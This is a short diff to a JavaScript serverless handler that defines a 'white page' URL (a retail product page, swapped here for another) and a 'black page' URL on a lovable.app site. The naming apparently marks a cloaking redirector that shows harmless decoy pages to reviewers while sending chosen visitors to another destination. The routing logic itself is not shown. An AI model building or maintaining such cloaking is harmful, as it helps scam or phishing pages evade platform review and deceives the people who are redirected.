@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.sportsdirect.com/hummel-denmark-home-shirt-2025-adults-373065#colcode=37306508";
+    const whitePageURL = "https://www.ruggedstore.be/en/Accezz-Backcover-voor-Samsung-Galaxy-Xcover-5-Transparent";
     const blackPageURL = "https://nowhereher.lovable.app/";
 
     //testing
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
